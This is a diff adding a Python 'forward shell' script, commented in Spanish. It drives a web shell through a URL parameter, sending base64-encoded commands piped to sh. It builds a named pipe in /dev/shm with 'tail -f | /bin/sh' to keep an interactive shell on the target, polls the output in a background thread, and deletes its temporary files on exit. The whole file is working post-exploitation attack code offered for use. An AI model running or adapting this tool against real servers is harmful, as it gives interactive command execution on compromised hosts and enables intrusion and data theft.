@@ -1,0 +1,179 @@
+#!/usr/bin/python3
+# -*- coding: utf-8 -*-
+
+import requests
+import time
+import threading
+import signal
+import sys
+from base64 import b64encode
+from random import randrange
+import os
+from urllib.parse import quote_plus
+
+# -------------------------
+# Helpers / configuración
+# -------------------------
+def get_username_and_hostname():
+    username = os.getenv('USER') or "g3kzzz"
+    hostname = os.uname()[1] or "chupetin"
+    return username, hostname
+
+def get_url():
+    url = input("Input URL: ").strip()
+    return url
+
+def nice_cwd():
+    cd = os.getcwd()
+    if cd == os.path.expanduser("~"):
+        return "~"
+    return cd
+
+# -------------------------
+# Request sender (compatible si URL termina en '=')
+# -------------------------
+def send_request_with_payload(url, payload_value, timeout=5):
+    """
+    Si la URL termina en '=' concatena la payload (url-encoded) directamente.
+    Si no, usa params={'cmd': payload_value} para mantener compatibilidad.
+    """
+    try:
+        if url.endswith('='):
+            # construye GET directo: url + encoded(payload)
+            encoded = quote_plus(payload_value, safe="/%:@()[]!$&'*,;=")
+            full = url + encoded
+            r = requests.get(full, timeout=timeout)
+        else:
+            r = requests.get(url, params={'cmd': payload_value}, timeout=timeout)
+        return r.text.strip()
+    except requests.RequestException as e:
+        return f"[!] Error en request: {e}"
+
+# -------------------------
+# Comandos remotos (base64 -> sh)
+# -------------------------
+def RunCmd(cmd, url):
+    encoded = b64encode(cmd.encode('utf-8')).decode('utf-8')
+    payload = f'echo "{encoded}" | base64 -d | sh'
+    return send_request_with_payload(url, payload)
+
+def WriteCmd(cmd, url):
+    # escribe al fifo stdin remoto
+    encoded = b64encode(cmd.encode('utf-8')).decode('utf-8')
+    payload = f'echo "{encoded}" | base64 -d > {stdin}'
+    return send_request_with_payload(url, payload)
+
+def ReadCmd(url):
+    return RunCmd(f"/bin/cat {stdout}", url)
+
+# -------------------------
+# Lectura en hilo
+# -------------------------
+class AllTheReads(object):
+    def __init__(self, interval=1, url=None):
+        self.interval = interval
+        self.url = url
+        self._stop = False
+        t = threading.Thread(target=self.run, daemon=True)
+        t.start()
+
+    def run(self):
+        while not self._stop:
+            output = ReadCmd(self.url)
+            if output:
+                # Limpiar dobles saltos o espacios extra si quieres
+                print(output)
+            time.sleep(self.interval)
+
+    def stop(self):
+        self._stop = True
+
+# -------------------------
+# Shell setup / cleanup
+# -------------------------
+def SetupShell(url):
+    # Creamos fifo y redirigimos la salida al stdout remoto
+    # Nota: usamos ; en vez de && para no interrumpir si mkfifo ya existe
+    cmd = f"mkfifo {stdin}; tail -f {stdin} | /bin/sh 2>&1 > {stdout} &"
+    return RunCmd(cmd, url)
+
+def clean_up(url):
+    # intentar eliminar los ficheros temporales
+    RunCmd(f"/bin/rm -f {stdin}", url)
+    RunCmd(f"/bin/rm -f {stdout}", url)
+
+# -------------------------
+# Variables globales
+# -------------------------
+session = randrange(1000, 9999)
+stdin = f"/dev/shm/input.{session}"
+stdout = f"/dev/shm/output.{session}"
+
+# -------------------------
+# Inicio
+# -------------------------
+url = get_url()
+
+# Intenta crear la shell remota
+_ = SetupShell(url)
+
+# Lanzamos lector en background
+reader = AllTheReads(interval=1, url=url)
+
+# Manejo de CTRL+C
+def sig_handler(sig, frame):
+    print("\n\n[*] Exiting...\n")
+    print("[*] Removing files...\n")
+    try:
+        reader.stop()
+        clean_up(url)
+    except Exception:
+        pass
+    print("[*] All files have been deleted\n")
+    sys.exit(0)
+
+signal.signal(signal.SIGINT, sig_handler)
+
+# -------------------------
+# Loop principal: PROMPT EN 2 LÍNEAS
+# -------------------------
+while True:
+    try:
+        username, hostname = get_username_and_hostname()
+        cwd = nice_cwd()
+        # Primera línea
+        prompt_line = f"[{username} ✘ {hostname}] - [{cwd}]"
+        print(prompt_line)
+        # Segunda línea: prompt corto
+        raw = input(">>> ").strip()
+
+        # soporte: si escribes algo con '=' lee lo que viene después del último '='
+        if "=" in raw:
+            command_to_execute = raw.split('=')[-1].strip()
+        else:
+            command_to_execute = raw
+
+        if not command_to_execute:
+            print("[!] Comando vacío. Escribe un comando válido o 'exit'.")
+            continue
+
+        if command_to_execute.lower() in ("exit", "quit"):
+            reader.stop()
+            clean_up(url)
+            print("[*] Exiting session...")
+            sys.exit(0)
+
+        # Escribimos el comando en el fifo remoto (agrega newline)
+        w = WriteCmd(command_to_execute + "\n", url)
+        # opcional: puedes imprimir la respuesta del write (normalmente vacío)
+        # print(w)
+        # esperamos un poco para que tail/sh ejecuten y vuelque stdout
+        time.sleep(1.1)
+
+    except EOFError:
+        # Ctrl+D
+        sig_handler(None, None)
+    except Exception as e:
+        print(f"[!] Error en loop principal: {e}")
+        time.sleep(0.5)
+
